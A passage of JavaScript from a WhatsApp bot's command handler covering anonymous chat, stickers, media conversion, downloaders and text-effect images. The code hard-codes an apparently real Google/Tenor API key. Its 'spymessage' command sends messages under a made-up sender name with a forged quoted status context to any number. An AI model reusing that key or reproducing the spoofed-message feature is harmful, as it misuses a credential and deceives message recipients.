            case 'getmsg': {
if (!text) throw `Example : ${prefix + command} file name\n\nView message list with ${prefix}listmsg`
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) throw `'${text}' not listed in the message list`
client.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 DATABASE LIST 」\n\n'
		for (let i of seplit) {
		    teks += `⫹⫺ *Name :* ${i.nama}\n⫹⫺ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		m.reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
	    case 'anonymous': {
if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
  { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
client.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await client.getName(m.sender)} Welcome To Anonymous Chat\n\nClick the button below to find a partner\`\`\``, botname, m)
            }
			break
            case 'keluar': case 'leave': {
if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
  let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``)
  throw false
}
m.reply('Ok')
let other = room.other(m.sender)
if (other) await client.sendText(other, `\`\`\`O parceiro saiu da sessão...\`\`\``, m)
delete this.anonymous[room.id]
if (command === 'leave') break
            }
            case 'mulai': case 'start': {
if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
  let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
  throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
  let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
  ]
  await client.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
  room.b = m.sender
  room.state = 'CHATTING'
  await client.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
} else {
  let id = + new Date
  this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
    return [this.a, this.b].includes(who)
},
other: function (who = '') {
    return who === this.a ? this.b : who === this.b ? this.a : ''
},
  }
  let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
}
break
            }
            case 'next': case 'lanjut': {
if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
  let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
  throw false
}
let other = romeo.other(m.sender)
if (other) await client.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
  let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
  ]
  await client.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
  room.b = m.sender
  room.state = 'CHATTING'
  await client.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
} else {
  let id = + new Date
  this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
    return [this.a, this.b].includes(who)
},
other: function (who = '') {
    return who === this.a ? this.b : who === this.b ? this.a : ''
},
  }
  let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
}
break
            }
            case 'public': {
if (!isCreator) throw mess.owner
client.public = true
m.reply('*Successful in Changing To Public Usage*')
            }
            break
            case 'self': {
if (!isCreator) throw mess.owner
client.public = false
m.reply('*Successful in Changing To Self Usage*')
            }
            break
            case 'ping': case 'p': case 'botstatus': case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
  cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
  last.total += cpu.total
  last.speed += cpu.speed / length
  last.times.user += cpu.times.user
  last.times.nice += cpu.times.nice
  last.times.sys += cpu.times.sys
  last.times.idle += cpu.times.idle
  last.times.irq += cpu.times.irq
  return last
}, {
  speed: 0,
  total: 0,
  times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Velocidade ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nTempo ON : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Usada_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usada_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usada_ (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
client.sendContact(m.chat, global.owner, fkontak)
            }
            break
            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
setbot.templateImage = true
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = false
m.reply(mess.success)
} else if (args[0] === 'templateVideo'){
setbot.templateImage = false
setbot.templateVideo = true
setbot.templateGif = false
setbot.templateMsg = false
m.reply(mess.success)
} else if (args[0] === 'templateGif'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = true
setbot.templateMsg = false
m.reply(mess.success)
} else if (args[0] === 'templateMessage'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = true
m.reply(mess.success)
} else {
let sections = [
{
title: "CHANGE MENU BOT",
rows: [
{title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
{title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
{title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
{title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
]
},
]
client.sendListMsg(m.chat, `pilih aja *${pushname}* the set menu!`, botname, `*Hello sis* !`, `Choose Set Menu`, sections, m)
}
            }
            break
            case 'sticker2': case 's2': case 'figu2': case 'f2': {
if (!quoted) throw `*Reply Video/Image With Caption* ${prefix + command}`
m.reply(mess.wait)
if (/image/.test(mime)) {
  let media = await quoted.download()
  let encmedia = await client.sendImageAsSticker(m.chat, media, m, { packname: `${q || `    ⛩・Entre no nosso\n grupo do WhatsApp:\n ⤻bit.ly/malia-md\n\n 📅・Data de Criação\n ⤻${xdate}`}`, author: `` })
  await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
  if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maximum 10 seconds!*')
  let media = await quoted.download()
  let encmedia = await client.sendVideoAsSticker(m.chat, media, m, { packname: `${q || `    ⛩・Entre no nosso\n grupo do WhatsApp:\n ⤻bit.ly/malia-md\n\n 📅・Data de Criação\n ⤻${xdate}`}`, author: `` })
  await fs.unlinkSync(encmedia)
} else {
  throw `*Send Image/Video With Caption* ${prefix + command}\nDuration *Video 1-9 Seconds*`
  }
}
break
            case 'sticker': case 's': case 'figu': case 'f': {
            if (!quoted) throw `*Reply Video/Image With Caption* ${prefix + command}`
            m.reply(mess.wait)
  if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await client.sendImageAsSticker(m.chat, media, m, { packname: `    ⛩・Entre no nosso\n grupo do WhatsApp:\n ⤻bit.ly/malia-md\n\n 📅・Data de Criação\n ⤻${xdate}`, author: `🇧🇷・Figurinha criada\npela comunidade:\n⤻'Malia-Md'\n\n🌟・Feita por:\n⤻${pushname}` })
await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maximum 10 seconds!*')
let media = await quoted.download()
let encmedia = await client.sendVideoAsSticker(m.chat, media, m, { packname: `    ⛩・Entre no nosso\n grupo do WhatsApp:\n ⤻bit.ly/malia-md\n\n 📅・Data de Criação\n ⤻${xdate}`, author: `🇧🇷・Figurinha criada\npela comunidade:\n⤻'Malia-Md'\n\n🌟・Feita por:\n⤻${pushname}` })
await fs.unlinkSync(encmedia)
            } else {
throw `*Send Image/Video With Caption* ${prefix + command}\nDuration *Video 1-9 Seconds*`
}
            }
            break
         case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await client.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await client.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await client.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'client', 'morou', m, {asSticker: true})

         }
         break
         case 'tts': {
         	if (!text) throw `Example : ${prefix + command} text`
             let tts = await getBuffer(`https://saipulanuar.ga/api/text-to-audio/tts?text=${text}&idbahasa=pt`)
             client.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', fileName: `${text}.mp3` }, { quoted: fvn })
         	}
         break 
            case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Reply sticker with caption *${prefix + command}*`
m.reply(mess.wait)
let media = await client.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
  fs.unlinkSync(media)
  if (err) throw err
  let buffer = fs.readFileSync(ran)
  client.sendMessage(m.chat, { image: buffer }, { quoted: m })
  fs.unlinkSync(ran)
})
            }
            break
	        case 'tomp4': case 'tovideo': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `reply sticker with caption *${prefix + command}*`
m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await client.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await client.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            client.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            client.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${client.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            client.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await client.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await client.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await client.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
  let anu = await TelegraPh(media)
  m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
  let anu = await UploadFileUgu(media)
  m.reply(util.format(anu))
}
await fs.unlinkSync(media)
            }
            break
	case 'spymessage': case 'menfess': {
		        if (m.isGroup) throw ('feature cannot be used in groups')
            	if (!text) throw `Example : ${prefix + command} 916909xxxxx|fictious name|message`
            var mon = args.join(' ')
            var m1 = mon.split("|")[0]
            var m2 = mon.split("|")[1]
            var m3 = mon.split("|")[2]
               let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${author}`,jpegThumbnail: thumb}}}
               let mq1 = m1 + '@s.whatsapp.net'
               let kawk = ('SECRET MESSAGE')
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
               let pjtxt = `Message From : ${m2} \nFor : @${mq1.split('@')[0]}\n\n${m3}`
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'Hem' }, type: 1 }]
            await client.sendButtonText(m1 + '@s.whatsapp.net', buttons, pjtxt, kawk, m, {mentions: ments, quoted: kafloc})
            let akhji = `Message Sent\nTo @${mq1.split('@')[0]}`
            await client.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
            }
            break
	    case 'yts': case 'ytsearch': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
  teks += `⫹⫺ No : ${no++}\n⫹⫺ Type : ${i.type}\n⫹⫺ Video ID : ${i.videoId}\n⫹⫺ Title : ${i.title}\n⫹⫺ Views : ${i.views}\n⫹⫺ Duration : ${i.timestamp}\n⫹⫺ Upload At : ${i.ago}\n⫹⫺ Author : ${i.author.name}\n⫹⫺ Url : ${i.url}\n\n─────────────────\n\n`
}
client.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google - Pesquisa : ${text}\n\n`
for (let g of res) {
teks += `⫹⫺ *Titulo* : ${g.title}\n`
teks += `⫹⫺ *Descrição* : ${g.snippet}\n`
teks += `⫹⫺ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
        case 'gimage': {
       if (!text) throw `Example : ${prefix + command} kaori cicak`
        anu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
        n = anu.result
        images = n[Math.floor(Math.random() * n.length)]
        let buttons = [
  {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
  image: { url: images },
  caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
  footer: client.user.name,
  buttons: buttons,
  headerType: 4
}
client.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
        break
        case 'play': {
if (!text) return m.reply(`Exemplo : ${prefix + command} YKWIM?`)
client.sendMessage(from, { react: { text: "🔍", key: m.key }})
datai = [];
let yts = require("yt-search")
let ysearch = await yts(text)
hdata = ysearch.all
num = 1
for(let i=0; i<hdata.length; i++){
datai.push({
  "rows": [
{
"title": `Titulo: ${hdata[i].title}`,
description: `Duração: ${hdata[i].timestamp || "Sem Informação"}  Canal: ${hdata[i].author.name}  Tipo: MP3`,
"rowId": `${prefix}ytaudio ${hdata[i].url}`
},
{
"title": `Titulo: ${hdata[i].title}`,
description: `Duração: ${hdata[i].timestamp || "Sem Informação"}  Canal: ${hdata[i].author.name}  Tipo: MP4`,
"rowId": `${prefix}ytvideo ${hdata[i].url}`
}
], title: `Resultado: ${num}`})
num += 1
}
  const sections = datai
  const listMessage = {
  text: `🔍 | RESULTADOS ENCONTRADOS`,
  footer: 'https://instagram.com/david.sousz',
  buttonText: "🎧 | ESCOLHER RESULTADO",
  sections
  }
  const sendMsg = await client.sendMessage(from, listMessage, {quoted: fakestatus})
          }
            break
 
	    case 'ytmp3': case 'ytaudio': {
let { yta } = require('./lib/y2mate')
         
  if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
  let quality = args[1] ? args[1] : '360p'
  let media = await ytv(text, quality)
  if (media.filesize >= 100000) return m.reply('Muti grande '+util.format(media))
  client.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp4` }, { quoted: m })
    }
            break
            case 'ytmp4': case 'ytvideo': {
let { ytv } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return m.reply('Muti grande '+util.format(media))
client.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⫹⫺ Titulo : ${media.title}\n⫹⫺ Tamanho : ${media.filesizeF}\n⫹⫺ Link : ${isUrl(text)}\n⫹⫺ Ext : MP3\n⫹⫺ Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break

case 'tiktoknowm':
			case 'tiktok':
			case 'tt':
			    if (!text) return m.reply('𝘓𝘪𝘯𝘬??')
				let p = await fdl.downloader.tiktok(q)
				let nih = ` Feito por ${author} Insta: @david.sousz`
				let buttons = [
  {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
]
let buttonMessage = {
  video: { url: p.nowm },
  caption: nih,
  title: 'TIKTOK DOWNLOADER',
  footer: botname,
  buttons: buttons,
  headerType: 5
}
client.sendMessage(from, buttonMessage, { quoted: m })
            
			    break
case 'tiktokmp3': 
			case 'tiktokaudio': {
				if (!text) return m.reply('Link Nya mana??')
				let aud = await fdl.downloader.tiktok(text)
				let cap = `𝘕𝘪𝘩 𝘒𝘢𝘬!👇`
				client.sendMessage(from, { caption: cap, image: {url: aud.thumbnail}})
				client.sendMessage(from, { audio: { url: aud.audio }, mimetype: 'audio/mpeg'}, { quoted: m })
				}
				break
case 'setbio':
if (!q) throw 'Send orders *#setbio text*'
client.setStatus(`${q}`)
throw mess.success
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'resetar':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
client.groupRevokeInvite(m.chat)
}
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
             if (!q) throw `Example : ${prefix + command} ${global.ownername}`
             m.reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
             let anu = await maker.textpro(link, q)
client.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
case'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dbox':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => client.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break

case 'waterdrop':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
